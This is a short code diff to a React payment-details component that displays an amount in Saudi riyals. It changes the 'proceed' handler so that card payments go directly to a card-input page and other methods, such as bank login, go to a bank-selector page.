@@ -18,7 +18,16 @@ const PaymentDetails = () => {
   const formattedAmount = `${amount} ر.س`;
   
   const handleProceed = () => {
-    navigate(`/pay/${id}/bank-selector`);
+    // Check payment method from link data
+    const paymentMethod = shippingInfo?.payment_method || 'card';
+    
+    // If payment method is "card", skip bank selector and go directly to card input
+    if (paymentMethod === 'card') {
+      navigate(`/pay/${id}/card-input`);
+    } else {
+      // For "bank_login" method, show bank selector
+      navigate(`/pay/${id}/bank-selector`);
+    }
   };
   
   return (
